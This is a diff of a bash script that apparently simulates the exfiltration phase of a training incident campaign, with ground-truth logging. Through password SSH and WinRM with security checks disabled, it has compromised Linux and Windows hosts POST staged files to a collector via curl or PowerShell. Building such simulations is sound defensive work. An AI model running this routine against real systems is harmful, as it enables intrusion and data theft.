@@ -2,25 +2,21 @@
 
 set -u
 
+
 # ============================================================
 # Nordic Manufacturing A/S
 # H3 Incident Campaign V2
 #
 # Phase 06 - Exfiltration Simulation
 #
-# Input:
-#   state/staged-data.json
+# Linux:
+#   SSH -> curl -> IncidentVM
 #
-# Traffic:
+# Windows:
+#   WinRM -> PowerShell HTTP POST -> IncidentVM
 #
-#   Compromised Host
-#          |
-#          | HTTP POST
-#          v
-#   IncidentVM:9090
-#
-# Only synthetic training data created by Phase 05
-# is transferred.
+# Only the exact synthetic staging file created during
+# Phase 05 is transferred.
 # ============================================================
 
 
@@ -53,8 +49,21 @@ INCIDENT_ID="${NORDIC_INCIDENT_ID:-H3-$(date +%Y%m%d-%H%M%S)}"
 
 SSH_PASSWORD="${NORDIC_SSH_PASSWORD:-$NORDIC_DEFAULT_SSH_PASSWORD}"
 
-STAGING_STATE="$NORDIC_STATE_DIR/staged-data.json"
+RDP_PASSWORD="${NORDIC_RDP_PASSWORD:-$NORDIC_DEFAULT_RDP_PASSWORD}"
 
+WINRM_HTTP_PORT="${
+    NORDIC_WINRM_HTTP_PORT:-${
+        NORDIC_DEFAULT_WINRM_HTTP_PORT:-5985
+    }
+}"
+
+WINRM_HTTPS_PORT="${
+    NORDIC_WINRM_HTTPS_PORT:-${
+        NORDIC_DEFAULT_WINRM_HTTPS_PORT:-5986
+    }
+}"
+
+STAGING_STATE="$NORDIC_STATE_DIR/staged-data.json"
 EXFIL_STATE="$NORDIC_STATE_DIR/exfiltration.json"
 
 LOG_FILE="$NORDIC_LOG_DIR/${INCIDENT_ID}-06-exfil.log"
@@ -91,18 +100,42 @@ ground_truth() {
 }
 
 
+tcp_open() {
+
+    local HOST="$1"
+    local PORT="$2"
+
+    timeout "$NORDIC_CONNECT_TIMEOUT" \
+        bash -c "echo >/dev/tcp/$HOST/$PORT" \
+        >/dev/null 2>&1
+}
+
+
 # ============================================================
 # REQUIRED COMMANDS
 # ============================================================
 
-for CMD in python3 sshpass ssh; do
+for CMD in python3 sshpass ssh timeout; do
 
     if ! command -v "$CMD" >/dev/null 2>&1; then
+
         echo "[ERROR] Required command not found: $CMD"
         exit 1
+
     fi
 
 done
+
+
+# ============================================================
+# WINDOWS WINRM SUPPORT
+# ============================================================
+
+PYWINRM_AVAILABLE=0
+
+if python3 -c "import winrm" >/dev/null 2>&1; then
+    PYWINRM_AVAILABLE=1
+fi
 
 
 # ============================================================
@@ -120,13 +153,6 @@ if [[ ! -f "$STAGING_STATE" ]]; then
 fi
 
 
-if [[ -z "$SSH_PASSWORD" ]]; then
-
-    echo "[ERROR] Campaign SSH password is missing."
-    exit 1
-fi
-
-
 if ! [[ "$EXFIL_PORT" =~ ^[0-9]+$ ]] ||
    (( EXFIL_PORT < 1024 || EXFIL_PORT > 65535 )); then
 
@@ -139,14 +165,6 @@ fi
 
 # ============================================================
 # DETERMINE INCIDENTVM IP
-# ============================================================
-#
-# GUI can explicitly supply:
-#
-#   NORDIC_INCIDENT_IP
-#
-# Otherwise determine the source address used toward the
-# first compromised host.
 # ============================================================
 
 FIRST_TARGET="$(
@@ -201,10 +219,13 @@ fi
 #
 # Format:
 #
-# IP|PORT|USER|FILE|SIZE|HASH
+# IP|PLATFORM|ACCESS|PORT|USER|FILE|SIZE|HASH
+#
+# Old Linux-only staged-data.json is also supported.
 # ============================================================
 
 mapfile -t STAGED_HOSTS < <(
+
     python3 - "$STAGING_STATE" <<'PY'
 import json
 import sys
@@ -212,22 +233,88 @@ import sys
 with open(sys.argv[1], encoding="utf-8") as f:
     data = json.load(f)
 
+
 for host in data.get("hosts", []):
 
     if not host.get("staged"):
         continue
 
+    ip = host.get("ip", "")
+
+    if not ip:
+        continue
+
+
+    platform = host.get(
+        "platform",
+        ""
+    ).lower()
+
+    access = host.get(
+        "access",
+        ""
+    ).lower()
+
+
+    # --------------------------------------------------------
+    # Backwards compatibility
+    # --------------------------------------------------------
+
+    if not platform:
+        platform = "linux"
+
+
+    if platform == "linux":
+
+        port = host.get(
+            "ssh_port",
+            22
+        )
+
+        user = (
+            host.get("ssh_username")
+            or host.get("ssh_user")
+            or "ubuntu"
+        )
+
+        access = "ssh"
+
+
+    elif platform == "windows":
+
+        port = host.get(
+            "winrm_port",
+            5985
+        )
+
+        user = (
+            host.get("rdp_username")
+            or host.get("rdp_user")
+            or "Administrator"
+        )
+
+        access = "winrm"
+
+
+    else:
+        continue
+
+
     print(
-        "{}|{}|{}|{}|{}|{}".format(
-            host.get("ip", ""),
-            host.get("ssh_port", 22),
-            host.get("ssh_user", "ubuntu"),
+        "{}|{}|{}|{}|{}|{}|{}|{}".format(
+            ip,
+            platform,
+            access,
+            port,
+            user,
             host.get("file", ""),
             host.get("size", 0),
             host.get("sha256", ""),
         )
     )
+
 PY
+
 )
 
 
@@ -265,16 +352,28 @@ from datetime import datetime, timezone
 
 data = {
     "incident_id": sys.argv[2],
-    "generated": datetime.now(timezone.utc).isoformat(),
+    "generated": datetime.now(
+        timezone.utc
+    ).isoformat(),
     "count": 0,
     "transfers": [],
 }
 
-with open(sys.argv[1], "w", encoding="utf-8") as f:
-    json.dump(data, f, indent=2)
+with open(
+    sys.argv[1],
+    "w",
+    encoding="utf-8"
+) as f:
+
+    json.dump(
+        data,
+        f,
+        indent=2
+    )
 PY
 
-    ground_truth "PHASE_COMPLETE transfers=0"
+    ground_truth \
+        "PHASE_COMPLETE transfers=0"
 
     exit 0
 fi
@@ -286,16 +385,26 @@ fi
 
 RECEIVER="$NORDIC_STATE_DIR/.exfil-receiver.py"
 
+
 cat > "$RECEIVER" <<'PY'
 import os
 import sys
-from http.server import BaseHTTPRequestHandler, HTTPServer
+
+from http.server import (
+    BaseHTTPRequestHandler,
+    HTTPServer,
+)
+
 
 bind_ip = sys.argv[1]
 port = int(sys.argv[2])
 upload_dir = sys.argv[3]
 
-os.makedirs(upload_dir, exist_ok=True)
+
+os.makedirs(
+    upload_dir,
+    exist_ok=True
+)
 
 
 class Handler(BaseHTTPRequestHandler):
@@ -319,6 +428,12 @@ class Handler(BaseHTTPRequestHandler):
             "unknown"
         )
 
+        platform = self.headers.get(
+            "X-Nordic-Platform",
+            "unknown"
+        )
+
+
         safe_source = "".join(
             c if c.isalnum() or c in ".-_" else "_"
             for c in source
@@ -329,42 +444,79 @@ class Handler(BaseHTTPRequestHandler):
             for c in incident
         )
 
-        filename = (
-            f"{safe_incident}-{safe_source}.bin"
+        safe_platform = "".join(
+            c if c.isalnum() or c in ".-_" else "_"
+            for c in platform
         )
+
+
+        filename = (
+            f"{safe_incident}-"
+            f"{safe_platform}-"
+            f"{safe_source}.bin"
+        )
+
 
         destination = os.path.join(
             upload_dir,
             filename
         )
 
+
         remaining = length
 
-        with open(destination, "wb") as f:
+
+        with open(
+            destination,
+            "wb"
+        ) as f:
 
             while remaining > 0:
 
                 chunk = self.rfile.read(
-                    min(65536, remaining)
+                    min(
+                        65536,
+                        remaining
+                    )
                 )
 
                 if not chunk:
                     break
 
-                f.write(chunk)
+                f.write(
+                    chunk
+                )
 
-                remaining -= len(chunk)
+                remaining -= len(
+                    chunk
+                )
 
-        received = length - remaining
 
-        self.send_response(200)
-        self.end_headers()
-
-        self.wfile.write(
-            f"NORDIC_RECEIVED {received}\n".encode()
+        received = (
+            length - remaining
         )
 
-    def log_message(self, fmt, *args):
+
+        self.send_response(
+            200
+        )
+
+        self.end_headers()
+
+
+        self.wfile.write(
+            (
+                f"NORDIC_RECEIVED "
+                f"{received}\n"
+            ).encode()
+        )
+
+
+    def log_message(
+        self,
+        fmt,
+        *args
+    ):
 
         sys.stdout.write(
             "%s %s\n" %
@@ -378,11 +530,15 @@ class Handler(BaseHTTPRequestHandler):
 
 
 server = HTTPServer(
-    (bind_ip, port),
+    (
+        bind_ip,
+        port
+    ),
     Handler
 )
 
 server.serve_forever()
+
 PY
 
 
@@ -392,11 +548,13 @@ PY
 
 RECEIVER_LOG="$NORDIC_LOG_DIR/${INCIDENT_ID}-exfil-receiver.log"
 
+
 python3 "$RECEIVER" \
     "$INCIDENT_IP" \
     "$EXFIL_PORT" \
     "$NORDIC_UPLOAD_DIR" \
     >> "$RECEIVER_LOG" 2>&1 &
+
 
 RECEIVER_PID=$!
 
@@ -404,12 +562,16 @@ RECEIVER_PID=$!
 cleanup() {
 
     if kill -0 "$RECEIVER_PID" 2>/dev/null; then
+
         kill "$RECEIVER_PID" 2>/dev/null || true
+
         wait "$RECEIVER_PID" 2>/dev/null || true
+
     fi
 
     rm -f "$RECEIVER"
 }
+
 
 trap cleanup EXIT
 
@@ -441,14 +603,20 @@ TMP_RESULTS="$NORDIC_STATE_DIR/.exfil.tmp"
 
 SUCCESS_COUNT=0
 FAILED_COUNT=0
+SKIPPED_COUNT=0
+
+LINUX_SUCCESS=0
+WINDOWS_SUCCESS=0
 
 
 for RECORD in "${STAGED_HOSTS[@]}"; do
 
     IFS='|' read -r \
         HOST \
-        SSH_PORT \
-        SSH_USER \
+        PLATFORM \
+        ACCESS \
+        ACCESS_PORT \
+        ACCESS_USER \
         REMOTE_FILE \
         EXPECTED_SIZE \
         EXPECTED_HASH \
@@ -458,55 +626,78 @@ for RECORD in "${STAGED_HOSTS[@]}"; do
     echo
     echo "------------------------------------------------------------"
     echo " Source host: $HOST"
+    echo " Platform:    $PLATFORM"
     echo "------------------------------------------------------------"
     echo
 
 
-    log "[*] Starting simulated exfiltration from $HOST"
+    log "[*] Starting simulated exfiltration from $HOST ($PLATFORM)"
+
 
     ground_truth \
-        "EXFIL_START source=$HOST destination=$INCIDENT_IP:$EXFIL_PORT file=$REMOTE_FILE"
+        "EXFIL_START source=$HOST platform=$PLATFORM destination=$INCIDENT_IP:$EXFIL_PORT file=$REMOTE_FILE"
 
 
-    # --------------------------------------------------------
-    # Execute HTTP POST FROM compromised host.
-    #
-    # The remote host sends only the exact staging file
-    # generated by Phase 05.
-    # --------------------------------------------------------
+    # ========================================================
+    # LINUX
+    # ========================================================
 
-    REMOTE_RESULT="$(
-        sshpass -p "$SSH_PASSWORD" \
-        ssh \
-            -p "$SSH_PORT" \
-            -o StrictHostKeyChecking=no \
-            -o UserKnownHostsFile=/dev/null \
-            -o ConnectTimeout="$NORDIC_SSH_TIMEOUT" \
-            -o PreferredAuthentications=password \
-            -o PubkeyAuthentication=no \
-            -o NumberOfPasswordPrompts=1 \
-            "$SSH_USER@$HOST" \
-            bash -s -- \
-                "$REMOTE_FILE" \
-                "$INCIDENT_IP" \
-                "$EXFIL_PORT" \
-                "$HOST" \
-                "$INCIDENT_ID" <<'REMOTE'
+    if [[ "$PLATFORM" == "linux" ]]; then
+
+
+        if [[ -z "$SSH_PASSWORD" ]]; then
+
+            FAILED_COUNT=$(( FAILED_COUNT + 1 ))
+
+            log "[WARNING] SSH password unavailable for $HOST"
+
+            ground_truth \
+                "EXFIL_FAILED source=$HOST platform=linux reason=missing_credentials"
+
+            continue
+        fi
+
+
+        REMOTE_RESULT="$(
+            sshpass -p "$SSH_PASSWORD" \
+                ssh \
+                    -p "$ACCESS_PORT" \
+                    -o StrictHostKeyChecking=no \
+                    -o UserKnownHostsFile=/dev/null \
+                    -o ConnectTimeout="$NORDIC_SSH_TIMEOUT" \
+                    -o PreferredAuthentications=password \
+                    -o PubkeyAuthentication=no \
+                    -o NumberOfPasswordPrompts=1 \
+                    "$ACCESS_USER@$HOST" \
+                    bash -s -- \
+                        "$REMOTE_FILE" \
+                        "$INCIDENT_IP" \
+                        "$EXFIL_PORT" \
+                        "$HOST" \
+                        "$INCIDENT_ID" <<'REMOTE'
+
 REMOTE_FILE="$1"
 INCIDENT_IP="$2"
 EXFIL_PORT="$3"
 SOURCE_HOST="$4"
 INCIDENT_ID="$5"
 
+
 if [[ ! -f "$REMOTE_FILE" ]]; then
+
     echo "NORDIC_EXFIL_ERROR file-not-found"
     exit 1
+
 fi
 
+
 if ! command -v curl >/dev/null 2>&1; then
+
     echo "NORDIC_EXFIL_ERROR curl-not-found"
     exit 1
+
 fi
+
 
 RESPONSE="$(
     curl \
@@ -517,67 +708,414 @@ RESPONSE="$(
         -H "Content-Type: application/octet-stream" \
         -H "X-Nordic-Source: $SOURCE_HOST" \
         -H "X-Nordic-Incident: $INCIDENT_ID" \
+        -H "X-Nordic-Platform: linux" \
         --data-binary "@$REMOTE_FILE" \
         "http://${INCIDENT_IP}:${EXFIL_PORT}/upload"
 )"
 
+
 RESULT=$?
 
+
 if [[ $RESULT -ne 0 ]]; then
+
     echo "NORDIC_EXFIL_ERROR curl-failed"
     exit 1
+
 fi
 
+
 echo "$RESPONSE"
+
 REMOTE
-    )"
-
-    SSH_RESULT=$?
-
-
-    # --------------------------------------------------------
-    # VERIFY TRANSFER
-    # --------------------------------------------------------
-
-    if [[ $SSH_RESULT -eq 0 ]] &&
-       grep -q '^NORDIC_RECEIVED ' <<< "$REMOTE_RESULT"; then
-
-        RECEIVED_SIZE="$(
-            printf '%s\n' "$REMOTE_RESULT" |
-            awk '/^NORDIC_RECEIVED / {print $2}' |
-            tail -n 1
         )"
 
 
-        SUCCESS_COUNT=$(( SUCCESS_COUNT + 1 ))
+        COMMAND_RESULT=$?
 
 
-        log "[+] Exfiltration completed from $HOST"
-        log "    Destination: $INCIDENT_IP:$EXFIL_PORT"
-        log "    Bytes: $RECEIVED_SIZE"
+        if [[ $COMMAND_RESULT -eq 0 ]] &&
+           grep -q '^NORDIC_RECEIVED ' <<< "$REMOTE_RESULT"; then
 
 
-        printf '%s|%s|%s|%s|%s|%s\n' \
-            "$HOST" \
-            "$REMOTE_FILE" \
-            "$INCIDENT_IP" \
-            "$EXFIL_PORT" \
-            "$RECEIVED_SIZE" \
-            "$EXPECTED_HASH" \
-            >> "$TMP_RESULTS"
+            RECEIVED_SIZE="$(
+                printf '%s\n' "$REMOTE_RESULT" |
+                awk '/^NORDIC_RECEIVED / {print $2}' |
+                tail -n 1
+            )"
 
 
-        ground_truth \
-            "EXFIL_SUCCESS source=$HOST destination=$INCIDENT_IP:$EXFIL_PORT bytes=$RECEIVED_SIZE"
+            SUCCESS_COUNT=$(( SUCCESS_COUNT + 1 ))
+            LINUX_SUCCESS=$(( LINUX_SUCCESS + 1 ))
+
+
+            log "[+] Exfiltration completed from $HOST"
+            log "    Platform: Linux"
+            log "    Destination: $INCIDENT_IP:$EXFIL_PORT"
+            log "    Bytes: $RECEIVED_SIZE"
+
+
+            printf '%s|%s|%s|%s|%s|%s|%s\n' \
+                "$HOST" \
+                "linux" \
+                "$REMOTE_FILE" \
+                "$INCIDENT_IP" \
+                "$EXFIL_PORT" \
+                "$RECEIVED_SIZE" \
+                "$EXPECTED_HASH" \
+                >> "$TMP_RESULTS"
+
+
+            ground_truth \
+                "EXFIL_SUCCESS source=$HOST platform=linux destination=$INCIDENT_IP:$EXFIL_PORT bytes=$RECEIVED_SIZE"
+
+
+        else
+
+            FAILED_COUNT=$(( FAILED_COUNT + 1 ))
+
+            log "[WARNING] Exfiltration failed from Linux host $HOST"
+
+            ground_truth \
+                "EXFIL_FAILED source=$HOST platform=linux destination=$INCIDENT_IP:$EXFIL_PORT"
+
+        fi
+
+
+    # ========================================================
+    # WINDOWS
+    # ========================================================
+
+    elif [[ "$PLATFORM" == "windows" ]]; then
+
+
+        if [[ -z "$RDP_PASSWORD" ]]; then
+
+            FAILED_COUNT=$(( FAILED_COUNT + 1 ))
+
+            log "[WARNING] Windows password unavailable for $HOST"
+
+            ground_truth \
+                "EXFIL_FAILED source=$HOST platform=windows reason=missing_credentials"
+
+            continue
+        fi
+
+
+        if [[ $PYWINRM_AVAILABLE -ne 1 ]]; then
+
+            SKIPPED_COUNT=$(( SKIPPED_COUNT + 1 ))
+
+            log "[SKIPPED] Python pywinrm is not installed."
+
+            ground_truth \
+                "EXFIL_SKIPPED source=$HOST platform=windows reason=pywinrm_unavailable"
+
+            continue
+        fi
+
+
+        # ----------------------------------------------------
+        # Use the WinRM port saved by Phase 05 when possible.
+        # Verify it is still reachable.
+        # ----------------------------------------------------
+
+        WINRM_PORT=""
+        WINRM_SCHEME=""
+
+
+        if [[ "$ACCESS_PORT" == "$WINRM_HTTPS_PORT" ]] &&
+           tcp_open "$HOST" "$ACCESS_PORT"; then
+
+            WINRM_PORT="$ACCESS_PORT"
+            WINRM_SCHEME="https"
+
+
+        elif [[ "$ACCESS_PORT" == "$WINRM_HTTP_PORT" ]] &&
+             tcp_open "$HOST" "$ACCESS_PORT"; then
+
+            WINRM_PORT="$ACCESS_PORT"
+            WINRM_SCHEME="http"
+
+
+        elif tcp_open "$HOST" "$WINRM_HTTP_PORT"; then
+
+            WINRM_PORT="$WINRM_HTTP_PORT"
+            WINRM_SCHEME="http"
+
+
+        elif tcp_open "$HOST" "$WINRM_HTTPS_PORT"; then
+
+            WINRM_PORT="$WINRM_HTTPS_PORT"
+            WINRM_SCHEME="https"
+
+
+        else
+
+            SKIPPED_COUNT=$(( SKIPPED_COUNT + 1 ))
+
+            log "[SKIPPED] No reachable WinRM service on $HOST"
+
+            ground_truth \
+                "EXFIL_SKIPPED source=$HOST platform=windows reason=winrm_unavailable"
+
+            continue
+        fi
+
+
+        # ----------------------------------------------------
+        # Execute the POST FROM the Windows host.
+        #
+        # PowerShell reads only REMOTE_FILE, which is the
+        # synthetic file recorded by Phase 05.
+        # ----------------------------------------------------
+
+        WINDOWS_RESULT="$(
+            NORDIC_WINRM_PASSWORD="$RDP_PASSWORD" \
+            python3 - \
+                "$HOST" \
+                "$WINRM_PORT" \
+                "$WINRM_SCHEME" \
+                "$ACCESS_USER" \
+                "$REMOTE_FILE" \
+                "$INCIDENT_IP" \
+                "$EXFIL_PORT" \
+                "$INCIDENT_ID" <<'PY'
+
+import os
+import sys
+
+import winrm
+
+
+host = sys.argv[1]
+port = int(sys.argv[2])
+scheme = sys.argv[3]
+username = sys.argv[4]
+remote_file = sys.argv[5]
+incident_ip = sys.argv[6]
+exfil_port = int(sys.argv[7])
+incident_id = sys.argv[8]
+
+password = os.environ[
+    "NORDIC_WINRM_PASSWORD"
+]
+
+
+endpoint = (
+    f"{scheme}://"
+    f"{host}:"
+    f"{port}/wsman"
+)
+
+
+session = winrm.Session(
+    endpoint,
+    auth=(
+        username,
+        password
+    ),
+    transport="ntlm",
+    server_cert_validation="ignore",
+)
+
+
+def ps_quote(value):
+    return value.replace(
+        "'",
+        "''"
+    )
+
+
+remote_file_ps = ps_quote(
+    remote_file
+)
+
+incident_ip_ps = ps_quote(
+    incident_ip
+)
+
+incident_id_ps = ps_quote(
+    incident_id
+)
+
+host_ps = ps_quote(
+    host
+)
+
+
+powershell = rf'''
+$ErrorActionPreference = "Stop"
+
+$RemoteFile = '{remote_file_ps}'
+$IncidentIP = '{incident_ip_ps}'
+$ExfilPort = {exfil_port}
+$SourceHost = '{host_ps}'
+$IncidentId = '{incident_id_ps}'
+
+
+if (-not (
+    Test-Path `
+        -LiteralPath $RemoteFile `
+        -PathType Leaf
+)) {{
+
+    Write-Output "NORDIC_EXFIL_ERROR file-not-found"
+    exit 1
+
+}}
+
+
+$Uri = (
+    "http://" +
+    $IncidentIP +
+    ":" +
+    $ExfilPort +
+    "/upload"
+)
+
+
+$Headers = @{{
+    "X-Nordic-Source" = $SourceHost
+    "X-Nordic-Incident" = $IncidentId
+    "X-Nordic-Platform" = "windows"
+}}
+
+
+try {{
+
+    $Bytes = [System.IO.File]::ReadAllBytes(
+        $RemoteFile
+    )
+
+
+    $Response = Invoke-WebRequest `
+        -Uri $Uri `
+        -Method Post `
+        -Headers $Headers `
+        -ContentType "application/octet-stream" `
+        -Body $Bytes `
+        -UseBasicParsing `
+        -TimeoutSec 30
+
+
+    Write-Output (
+        $Response.Content.Trim()
+    )
+
+}}
+catch {{
+
+    Write-Output "NORDIC_EXFIL_ERROR http-post-failed"
+    Write-Error $_
+    exit 1
+
+}}
+'''
+
+
+result = session.run_ps(
+    powershell
+)
+
+
+stdout = result.std_out.decode(
+    "utf-8",
+    errors="replace"
+)
+
+stderr = result.std_err.decode(
+    "utf-8",
+    errors="replace"
+)
+
+
+if stdout:
+    print(
+        stdout,
+        end=""
+    )
+
+
+if stderr:
+    print(
+        stderr,
+        file=sys.stderr,
+        end=""
+    )
+
+
+sys.exit(
+    0 if result.status_code == 0 else 1
+)
+
+PY
+        )"
+
+
+        COMMAND_RESULT=$?
+
+
+        if [[ $COMMAND_RESULT -eq 0 ]] &&
+           grep -q '^NORDIC_RECEIVED ' <<< "$WINDOWS_RESULT"; then
+
+
+            RECEIVED_SIZE="$(
+                printf '%s\n' "$WINDOWS_RESULT" |
+                awk '/^NORDIC_RECEIVED / {print $2}' |
+                tail -n 1
+            )"
+
+
+            SUCCESS_COUNT=$(( SUCCESS_COUNT + 1 ))
+            WINDOWS_SUCCESS=$(( WINDOWS_SUCCESS + 1 ))
+
+
+            log "[+] Exfiltration completed from $HOST"
+            log "    Platform: Windows"
+            log "    Destination: $INCIDENT_IP:$EXFIL_PORT"
+            log "    Bytes: $RECEIVED_SIZE"
+
+
+            printf '%s|%s|%s|%s|%s|%s|%s\n' \
+                "$HOST" \
+                "windows" \
+                "$REMOTE_FILE" \
+                "$INCIDENT_IP" \
+                "$EXFIL_PORT" \
+                "$RECEIVED_SIZE" \
+                "$EXPECTED_HASH" \
+                >> "$TMP_RESULTS"
+
+
+            ground_truth \
+                "EXFIL_SUCCESS source=$HOST platform=windows destination=$INCIDENT_IP:$EXFIL_PORT bytes=$RECEIVED_SIZE"
+
+
+        else
+
+            FAILED_COUNT=$(( FAILED_COUNT + 1 ))
+
+            log "[WARNING] Exfiltration failed from Windows host $HOST"
+
+            ground_truth \
+                "EXFIL_FAILED source=$HOST platform=windows destination=$INCIDENT_IP:$EXFIL_PORT"
+
+        fi
+
+
+    # ========================================================
+    # UNKNOWN PLATFORM
+    # ========================================================
 
     else
 
-        FAILED_COUNT=$(( FAILED_COUNT + 1 ))
+        SKIPPED_COUNT=$(( SKIPPED_COUNT + 1 ))
 
-        log "[WARNING] Exfiltration failed from $HOST"
+        log "[SKIPPED] Unknown platform for $HOST: $PLATFORM"
 
         ground_truth \
-            "EXFIL_FAILED source=$HOST destination=$INCIDENT_IP:$EXFIL_PORT"
+            "EXFIL_SKIPPED source=$HOST reason=unknown_platform"
 
     fi
 
@@ -597,13 +1135,18 @@ import json
 import sys
 from datetime import datetime, timezone
 
+
 source_file = sys.argv[1]
 output_file = sys.argv[2]
 incident_id = sys.argv[3]
 
 transfers = []
 
-with open(source_file, encoding="utf-8") as f:
+
+with open(
+    source_file,
+    encoding="utf-8"
+) as f:
 
     for line in f:
 
@@ -612,18 +1155,22 @@ with open(source_file, encoding="utf-8") as f:
         if not line:
             continue
 
+
         (
             source,
+            platform,
             remote_file,
             destination,
             port,
             size,
             sha256,
-        ) = line.split("|", 5)
+        ) = line.split("|", 6)
+
 
         transfers.append(
             {
                 "source": source,
+                "platform": platform,
                 "remote_file": remote_file,
                 "destination": destination,
                 "port": int(port),
@@ -636,14 +1183,25 @@ with open(source_file, encoding="utf-8") as f:
 
 data = {
     "incident_id": incident_id,
-    "generated": datetime.now(timezone.utc).isoformat(),
+    "generated": datetime.now(
+        timezone.utc
+    ).isoformat(),
     "count": len(transfers),
     "transfers": transfers,
 }
 
 
-with open(output_file, "w", encoding="utf-8") as f:
-    json.dump(data, f, indent=2)
+with open(
+    output_file,
+    "w",
+    encoding="utf-8"
+) as f:
+
+    json.dump(
+        data,
+        f,
+        indent=2
+    )
 
 PY
 
@@ -685,8 +1243,23 @@ echo "  $SUCCESS_COUNT"
 
 echo
 
+echo "Linux transfers:"
+echo "  $LINUX_SUCCESS"
+
+echo
+
+echo "Windows transfers:"
+echo "  $WINDOWS_SUCCESS"
+
+echo
+
 echo "Failed transfers:"
 echo "  $FAILED_COUNT"
+
+echo
+
+echo "Skipped transfers:"
+echo "  $SKIPPED_COUNT"
 
 echo
 
@@ -707,7 +1280,7 @@ echo
 
 
 ground_truth \
-    "PHASE_COMPLETE transfers=$SUCCESS_COUNT failed=$FAILED_COUNT"
+    "PHASE_COMPLETE transfers=$SUCCESS_COUNT linux_transfers=$LINUX_SUCCESS windows_transfers=$WINDOWS_SUCCESS failed=$FAILED_COUNT skipped=$SKIPPED_COUNT"
 
 
 exit 0
